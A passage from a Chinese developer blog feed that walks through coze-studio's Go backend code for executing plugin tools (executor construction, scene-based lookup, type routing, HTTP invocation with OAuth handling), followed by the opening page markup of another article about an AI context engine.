            DebugStatus: ptr.Of(common.APIDebugStatus_DebugPassed),
        })
        <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
            logs.CtxErrorf(ctx, <span class="hljs-string">"UpdateDraftTool failed, tooID=%d, err=%v"</span>, req.ToolID, err)
        }
    }
    
    <span class="hljs-comment">// 6. 自动生成响应 Schema（可选）</span>
    <span class="hljs-keyword">var</span> respSchema openapi3.Responses
    <span class="hljs-keyword">if</span> opt.AutoGenRespSchema {
        respSchema, err = p.genToolResponseSchema(ctx, result.RawResp)
        <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, errorx.Wrapf(err, <span class="hljs-string">"genToolResponseSchema failed"</span>)
        }
    }
    
    <span class="hljs-comment">// 7. 构建并返回响应</span>
    resp = &amp;model.ExecuteToolResponse{
        Tool:        executor.tool,      <span class="hljs-comment">// 工具信息</span>
        Request:     result.Request,     <span class="hljs-comment">// 请求字符串（用于日志）</span>
        RawResp:     result.RawResp,     <span class="hljs-comment">// 原始响应</span>
        TrimmedResp: result.TrimmedResp, <span class="hljs-comment">// 裁剪后的响应（根据 Schema）</span>
        RespSchema:  respSchema,        <span class="hljs-comment">// 响应 Schema</span>
    }
    
    <span class="hljs-keyword">return</span> resp, <span class="hljs-literal">nil</span>
}
</code></pre>
<p>说明：</p>
<ul>
<li><code>ExecuteTool</code> 是统一执行入口，所有插件类型（HTTP/MCP/Custom）都通过此方法执行</li>
<li>执行流程：</li>
</ul>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR
    A[构建执行器&lt;br/&gt;buildToolExecutor] --&gt;|获取插件和工具信息| B[获取认证信息&lt;br/&gt;acquireAccessTokenIfNeed]
    B --&gt;|OAuth/API Key| C[执行工具&lt;br/&gt;executor.execute]
    C --&gt;|调用 Invocation| D[处理响应&lt;br/&gt;processResponse]
    D --&gt;|返回结果| E[ExecuteToolResponse]
    
    style A fill:#e1f5ff
    style B fill:#fff4e1
    style C fill:#ffe1f5
    style D fill:#e1ffe1
    style E fill:#e1f5ff
</code></pre>
<ul>
<li><code>executor.execute()</code> 会根据插件类型调用对应的 Invocation 实现</li>
</ul>
<h5 data-id="heading-43">2. buildToolExecutor（构建工具执行器）</h5>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *pluginServiceImpl)</span></span> buildToolExecutor(ctx context.Context, req *model.ExecuteToolRequest, opt *model.ExecuteToolOption) (impl *toolExecutor, err <span class="hljs-type">error</span>) {
    <span class="hljs-comment">// 1. 验证用户 ID</span>
    <span class="hljs-keyword">if</span> req.UserID == <span class="hljs-string">""</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, errorx.New(errno.ErrPluginExecuteToolFailed, errorx.KV(errno.PluginMsgKey, <span class="hljs-string">"userID is required"</span>))
    }
    
    <span class="hljs-keyword">var</span> (
        pl *entity.PluginInfo  <span class="hljs-comment">// 插件信息</span>
        tl *entity.ToolInfo    <span class="hljs-comment">// 工具信息</span>
    )
    
    <span class="hljs-comment">// 2. 根据执行场景获取插件和工具信息</span>
    <span class="hljs-keyword">switch</span> req.ExecScene {
    <span class="hljs-keyword">case</span> consts.ExecSceneOfOnlineAgent:
        <span class="hljs-comment">// 在线 Agent：从版本表获取工具配置</span>
        pl, tl, err = p.getOnlineAgentPluginInfo(ctx, req, opt)
    <span class="hljs-keyword">case</span> consts.ExecSceneOfDraftAgent:
        <span class="hljs-comment">// 草稿 Agent：从草稿表获取工具配置，并合并 Agent 的自定义配置</span>
        pl, tl, err = p.getDraftAgentPluginInfo(ctx, req, opt)
    <span class="hljs-keyword">case</span> consts.ExecSceneOfToolDebug:
        <span class="hljs-comment">// 工具调试：从草稿表获取</span>
        pl, tl, err = p.getToolDebugPluginInfo(ctx, req, opt)
    <span class="hljs-keyword">case</span> consts.ExecSceneOfWorkflow:
        <span class="hljs-comment">// Workflow：根据 ExecDraftTool 标志决定从草稿表还是在线表获取</span>
        pl, tl, err = p.getWorkflowPluginInfo(ctx, req, opt)
    <span class="hljs-keyword">default</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">"invalid execute scene '%s'"</span>, req.ExecScene)
    }
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err
    }
    
    <span class="hljs-comment">// 3. 构建工具执行器</span>
    impl = &amp;toolExecutor{
        execScene:                  req.ExecScene,                    <span class="hljs-comment">// 执行场景</span>
        userID:                     req.UserID,                      <span class="hljs-comment">// 用户 ID</span>
        conversationID:             opt.ConversationID,              <span class="hljs-comment">// 会话 ID（用于 HTTP Header）</span>
        plugin:                     pl,                               <span class="hljs-comment">// 插件信息</span>
        tool:                       tl,                               <span class="hljs-comment">// 工具信息</span>
        projectInfo:                opt.ProjectInfo,                 <span class="hljs-comment">// 项目信息（用于变量引用）</span>
        invalidRespProcessStrategy: opt.InvalidRespProcessStrategy,  <span class="hljs-comment">// 响应处理策略</span>
        oss:                        p.oss,                            <span class="hljs-comment">// OSS 存储（用于文件 URI 转换）</span>
    }
    
    <span class="hljs-comment">// 4. 如果提供了自定义 Operation，使用自定义的（用于 Agent 自定义配置）</span>
    <span class="hljs-keyword">if</span> opt.Operation != <span class="hljs-literal">nil</span> {
        impl.tool.Operation = opt.Operation
    }
    
    <span class="hljs-keyword">return</span> impl, <span class="hljs-literal">nil</span>
}
</code></pre>
<p>说明：</p>
<ul>
<li>根据执行场景（在线 Agent/草稿 Agent/Workflow/工具调试）获取插件和工具信息</li>
<li>不同场景的数据来源不同（版本表/草稿表/SaaS）</li>
<li>构建 <code>toolExecutor</code> 结构，包含插件信息、工具信息、项目信息等</li>
</ul>
<h5 data-id="heading-44">3. getWorkflowPluginInfo 示例（Workflow 场景）</h5>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *pluginServiceImpl)</span></span> getWorkflowPluginInfo(ctx context.Context, req *model.ExecuteToolRequest,
    execOpt *model.ExecuteToolOption) (pl *entity.PluginInfo, tl *entity.ToolInfo, err <span class="hljs-type">error</span>) {
    
    <span class="hljs-comment">// 1. 检查是否来自 SaaS</span>
    <span class="hljs-keyword">if</span> req.PluginFrom != <span class="hljs-literal">nil</span> &amp;&amp; *req.PluginFrom == bot_common.PluginFrom_FromSaas {
        <span class="hljs-comment">// 从 SaaS 获取插件和工具信息</span>
        tools, plugin, err := p.toolRepo.BatchGetSaasPluginToolsInfo(ctx, []<span class="hljs-type">int64</span>{req.PluginID})
        <span class="hljs-comment">// ... 查找对应的工具</span>
        <span class="hljs-keyword">return</span> pl, tl, <span class="hljs-literal">nil</span>
    }
    
    <span class="hljs-comment">// 2. 检查是否执行草稿工具</span>
    <span class="hljs-keyword">if</span> req.ExecDraftTool {
        <span class="hljs-comment">// 从草稿表获取</span>
        pl, exist, err := p.pluginRepo.GetDraftPlugin(ctx, req.PluginID)
        tl, exist, err := p.toolRepo.GetDraftTool(ctx, req.ToolID)
        <span class="hljs-keyword">return</span> pl, tl, <span class="hljs-literal">nil</span>
    }
    
    <span class="hljs-comment">// 3. 从在线表获取（支持版本）</span>
    <span class="hljs-keyword">if</span> execOpt.ToolVersion == <span class="hljs-string">""</span> {
        <span class="hljs-comment">// 获取最新版本</span>
        pl, exist, err := p.pluginRepo.GetOnlinePlugin(ctx, req.PluginID)
        tl, exist, err := p.toolRepo.GetOnlineTool(ctx, req.ToolID)
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 获取指定版本</span>
        pl, exist, err := p.pluginRepo.GetVersionPlugin(ctx, model.VersionPlugin{
            PluginID: req.PluginID,
            Version:  execOpt.ToolVersion,
        })
        tl, exist, err := p.toolRepo.GetVersionTool(ctx, model.VersionTool{
            ToolID:  req.ToolID,
            Version: execOpt.ToolVersion,
        })
    }
    
    <span class="hljs-keyword">return</span> pl, tl, <span class="hljs-literal">nil</span>
}
</code></pre>
<h5 data-id="heading-45">4. toolExecutor.execute（执行工具）</h5>
<p>代码位置：<code>backend/domain/plugin/service/exec_tool.go:610</code></p>
<p><code>toolExecutor.execute()</code> 是实际执行工具的方法，根据插件类型调用对应的 Invocation 实现：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(t *toolExecutor)</span></span> execute(ctx context.Context, argumentsInJson, accessToken, authURL <span class="hljs-type">string</span>) (resp *ExecuteResponse, err <span class="hljs-type">error</span>) {
    <span class="hljs-comment">// 1. 验证参数</span>
    <span class="hljs-keyword">if</span> argumentsInJson == <span class="hljs-string">""</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, errorx.New(errno.ErrPluginExecuteToolFailed,
            errorx.KV(errno.PluginMsgKey, <span class="hljs-string">"argumentsInJson is required"</span>))
    }
    
    <span class="hljs-comment">// 2. 🔑 构建 InvocationArgs（参数分组、公共参数注入、默认值处理等）</span>
    invocation, err := tool.NewInvocationArgs(ctx, &amp;tool.InvocationArgsBuilder{
        ArgsInJson:     argumentsInJson,
        ProjectInfo:    t.projectInfo,
        UserID:         t.userID,
        Plugin:         t.plugin,
        Tool:           t.tool,
        PluginManifest: t.plugin.Manifest,
        ServerURL:      t.plugin.GetServerURL(),
        AuthInfo: &amp;tool.AuthInfo{
            OAuth: &amp;tool.OAuthInfo{
                AccessToken: accessToken,
                AuthURL:     authURL,
            },
            MetaInfo: t.plugin.GetAuthInfo(),
        },
    })
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err
    }
    
    <span class="hljs-comment">// 3. 🔑 文件 URI 转换（非调试场景）</span>
    <span class="hljs-keyword">if</span> t.execScene != consts.ExecSceneOfToolDebug {
        <span class="hljs-comment">// 将文件 URI 转换为可访问的 URL</span>
        err = invocation.AssembleFileURIToURL(ctx, t.oss)
        <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err
        }
    }
    
    <span class="hljs-comment">// 4. 🔑 根据插件来源选择执行器</span>
    <span class="hljs-keyword">var</span> requestStr, rawResp <span class="hljs-type">string</span>
    <span class="hljs-keyword">if</span> t.plugin.Source != <span class="hljs-literal">nil</span> &amp;&amp; *t.plugin.Source == bot_common.PluginFrom_FromSaas {
        <span class="hljs-comment">// SaaS 插件：使用 SaaS 调用实现</span>
        requestStr, rawResp, err = tool.NewSaasCallImpl().Do(ctx, invocation)
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 🔑 普通插件：根据插件类型选择执行器（HTTP/MCP/Custom）</span>
        requestStr, rawResp, err = newToolInvocation(t).Do(ctx, invocation)
    }
    
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err
    }
    
    <span class="hljs-comment">// 5. 处理空响应</span>
    <span class="hljs-keyword">const</span> defaultResp = <span class="hljs-string">"{}"</span>
    <span class="hljs-keyword">if</span> rawResp == <span class="hljs-string">""</span> {
        <span class="hljs-keyword">return</span> &amp;ExecuteResponse{
            Request:     requestStr,
            TrimmedResp: defaultResp,
            RawResp:     defaultResp,
        }, <span class="hljs-literal">nil</span>
    }
    
    <span class="hljs-comment">// 6. 🔑 处理响应（根据 Schema 裁剪，只返回 LLM 需要的字段）</span>
    trimmedResp, err := t.processResponse(ctx, rawResp)
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err
    }
    <span class="hljs-keyword">if</span> trimmedResp == <span class="hljs-string">""</span> {
        trimmedResp = defaultResp
    }
    
    <span class="hljs-keyword">return</span> &amp;ExecuteResponse{
        Request:     requestStr,     <span class="hljs-comment">// 请求字符串（用于日志）</span>
        TrimmedResp: trimmedResp,    <span class="hljs-comment">// 裁剪后的响应（根据 Schema）</span>
        RawResp:     rawResp,        <span class="hljs-comment">// 原始响应</span>
    }, <span class="hljs-literal">nil</span>
}
</code></pre>
<p>说明：</p>
<ul>
<li><strong>InvocationArgs 构建</strong>：包含参数分组、公共参数注入、默认值处理、变量引用等</li>
<li><strong>文件 URI 转换</strong>：非调试场景下，将文件 URI 转换为可访问的 OSS URL</li>
<li><strong>执行器路由</strong>：SaaS 插件使用 <code>SaasCallImpl</code>，普通插件根据类型使用 <code>newToolInvocation()</code> 路由</li>
<li><strong>响应处理</strong>：根据响应 Schema 裁剪，只返回 LLM 需要的字段</li>
</ul>
<h5 data-id="heading-46">5. newToolInvocation（根据插件类型选择执行器）</h5>
<p>代码位置：<code>backend/domain/plugin/service/exec_tool.go:597</code></p>
<p>路由逻辑，根据插件类型实例化对应的执行器：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">newToolInvocation</span><span class="hljs-params">(t *toolExecutor)</span></span> tool.Invocation {
    <span class="hljs-keyword">switch</span> t.plugin.Manifest.API.Type {
    <span class="hljs-keyword">case</span> consts.PluginTypeOfCloud:
        <span class="hljs-comment">// HTTP 插件：使用 HTTP 调用实现</span>
        <span class="hljs-keyword">return</span> tool.NewHttpCallImpl(t.conversationID)
    <span class="hljs-keyword">case</span> consts.PluginTypeOfMCP:
        <span class="hljs-comment">// MCP 插件：使用 MCP 调用实现（官方未实现，我们已实现）</span>
        <span class="hljs-keyword">return</span> tool.NewMcpCallImpl()
    <span class="hljs-keyword">case</span> consts.PluginTypeOfCustom:
        <span class="hljs-comment">// 自定义插件：使用自定义调用实现</span>
        <span class="hljs-keyword">return</span> tool.NewCustomCallImpl()
    <span class="hljs-keyword">default</span>:
        <span class="hljs-comment">// 默认使用 HTTP 调用</span>
        <span class="hljs-keyword">return</span> tool.NewHttpCallImpl(t.conversationID)
    }
}
</code></pre>
<p>说明：</p>
<ul>
<li><strong>路由机制</strong>：根据 <code>plugin.Manifest.API.Type</code> 选择对应的执行器</li>
<li><strong>三种插件类型</strong>：HTTP（OpenAPI）、MCP、Custom</li>
<li><strong>扩展性</strong>：新增插件类型只需实现 <code>tool.Invocation</code> 接口，并在此处添加路由</li>
</ul>
<p>这里会实例化最开始介绍的插件类型（HTTP、MCP、自定义）。官方 MCP 还未实现，我们已实现，将在下一篇介绍。</p>
<p>到这里，插件的核心流程已介绍完毕。下一小节我们简要介绍一下 HTTP 插件的实现，便于后续实现自定义插件。</p>
<h3 data-id="heading-47">4.4 HTTP 插件执行流程</h3>
<h4 data-id="heading-48">4.4.1 HTTP 执行器主流程</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d3e4aaf8c4bd423a83cf6309829253c0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGV2WUs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765634928&amp;x-signature=%2BqmcPLzJkL0%2Fd%2Foge7Uxup9oJkM%3D" alt="image-20251206195204811" loading="lazy"/></p>
<p>自定义、MCP、HTTP 都是实现的 <code>Invocation</code> 接口，如需实现其它插件，可参考其中一个实现即可，这里以 HTTP 来进行举例。</p>
<p>HTTP 插件通过 <code>tool.NewHttpCallImpl()</code> 执行：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD
    A[构建 HTTP 请求] --&gt; B[注入认证信息]
    B --&gt; C{需要 OAuth?}
    C --&gt;|是| D{Token 有效?}
    D --&gt;|否| E[返回中断错误]
    D --&gt;|是| F[注入 Access Token]
    C --&gt;|否| G[发送 HTTP 请求]
    F --&gt; G
    G --&gt; H{状态码 200?}
    H --&gt;|否| I[返回错误]
    H --&gt;|是| J[返回响应]
</code></pre>
<p>代码位置：<code>backend/domain/plugin/service/tool/invocation_http.go</code></p>
<h4 data-id="heading-49">4.4.2 HTTP 执行器 Do 方法实现</h4>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(h *httpCallImpl)</span></span> Do(ctx context.Context, args *InvocationArgs) (request <span class="hljs-type">string</span>, resp <span class="hljs-type">string</span>, err <span class="hljs-type">error</span>) {
    <span class="hljs-comment">// 1. 构建 HTTP 请求（URL、Header、Body）</span>
    httpReq, err := h.buildHTTPRequest(ctx, args)
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>, <span class="hljs-string">""</span>, err
    }
    
    <span class="hljs-comment">// 2. 注入认证信息（OAuth、Service Token 等）</span>
    errMsg, err := h.injectAuthInfo(ctx, httpReq, args)
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>, <span class="hljs-string">""</span>, err
    }
    
    <span class="hljs-comment">// 3. 如果返回错误消息，说明需要 OAuth 授权</span>
    <span class="hljs-keyword">if</span> errMsg != <span class="hljs-string">""</span> {
        <span class="hljs-comment">// 创建中断事件，通知调用方需要用户授权</span>
        event := &amp;model.ToolInterruptEvent{
            Event: pluginConsts.InterruptEventTypeOfToolNeedOAuth,
            ToolNeedOAuth: &amp;model.ToolNeedOAuthInterruptEvent{
                Message: errMsg,  <span class="hljs-comment">// 包含授权 URL 的错误消息</span>
            },
        }
        <span class="hljs-comment">// 返回中断错误，Workflow 引擎会暂停执行并等待授权</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>, <span class="hljs-string">""</span>, compose.NewInterruptAndRerunErr(event)
    }
    
    <span class="hljs-comment">// 4. 读取请求体（用于序列化）</span>
    <span class="hljs-keyword">var</span> reqBodyBytes []<span class="hljs-type">byte</span>
    <span class="hljs-keyword">if</span> httpReq.GetBody != <span class="hljs-literal">nil</span> {
        reqBody, err := httpReq.GetBody()
        <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>, <span class="hljs-string">""</span>, err
        }
        <span class="hljs-keyword">defer</span> reqBody.Close()
        reqBodyBytes, err = io.ReadAll(reqBody)
        <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>, <span class="hljs-string">""</span>, err
        }
    }
    
    <span class="hljs-comment">// 5. 序列化请求（用于日志和返回给调用方）</span>
    requestStr, err := genRequestString(httpReq, reqBodyBytes)
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>, <span class="hljs-string">""</span>, err
    }
    
    <span class="hljs-comment">// 6. 使用 resty 发送 HTTP 请求</span>
    restyReq := defaultHttpCli.NewRequest()
    restyReq.Header = httpReq.Header
    restyReq.Method = httpReq.Method
    restyReq.URL = httpReq.URL.String()
    <span class="hljs-keyword">if</span> reqBodyBytes != <span class="hljs-literal">nil</span> {
        restyReq.SetBody(reqBodyBytes)
    }
    restyReq.SetContext(ctx)
    
    logs.CtxDebugf(ctx, <span class="hljs-string">"[execute] url=%s, header=%s, method=%s, body=%s"</span>,
        restyReq.URL, restyReq.Header, restyReq.Method, restyReq.Body)
    
    httpResp, err := restyReq.Send()
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>, <span class="hljs-string">""</span>, errorx.New(errno.ErrPluginExecuteToolFailed, 
            errorx.KVf(errno.PluginMsgKey, <span class="hljs-string">"http request failed, err=%s"</span>, err))
    }
    
    logs.CtxDebugf(ctx, <span class="hljs-string">"[execute] status=%s, response=%s"</span>, httpResp.Status(), httpResp.String())
    
    <span class="hljs-comment">// 7. 检查 HTTP 状态码</span>
    <span class="hljs-keyword">if</span> httpResp.StatusCode() != http.StatusOK {
        <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>, <span class="hljs-string">""</span>, errorx.New(errno.ErrPluginExecuteToolFailed,
            errorx.KVf(errno.PluginMsgKey, <span class="hljs-string">"http request failed, status=%s\nresp=%s"</span>, 
                httpResp.Status(), httpResp.String()))
    }
    
    <span class="hljs-comment">// 8. 返回请求字符串和响应字符串</span>
    <span class="hljs-keyword">return</span> requestStr, httpResp.String(), <span class="hljs-literal">nil</span>
}
</code></pre>
<p>HTTP 插件核心流程都在上面的 Do 函数中，感兴趣的可以直接看 <code>coze-studio/backend/domain/plugin/service/tool/invocation_http.go</code> 源码。</p>
<h3 data-id="heading-50">总结</h3>
<p>本文详细分析了 coze-studio 后端插件的加载流程和执行流程，从 HTTP API 请求到 SSE 响应的完整链路，为后续二次开发奠定了基础。</p>
<p>下一篇我们会详细介绍基于 coze-studio 来支持 mcp 协议，让 coze-studio 的功能更加完善</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[给你的AI编辑器插上翅膀！接入最强上下文引擎 - ACE(Augment Context Engine)]]></title>    <link>https://juejin.cn/post/7580329353352986670</link>    <guid>https://juejin.cn/post/7580329353352986670</guid>    <pubDate>2025-12-06T14:26:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580329353352986670" data-draft-id="7580310413754187826" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="给你的AI编辑器插上翅膀！接入最强上下文引擎 - ACE(Augment Context Engine)"/> <meta itemprop="keywords" content="AI编程,Claude,Cursor"/> <meta itemprop="datePublished" content="2025-12-06T14:26:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="极客密码"/> <meta itemprop="url" content="https://juejin.cn/user/976022055165608"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            给你的AI编辑器插上翅膀！接入最强上下文引擎 - ACE(Augment Context Engine)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/976022055165608/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    极客密码
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T14:26:20.000Z" title="Sat Dec 06 2025 14:26:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,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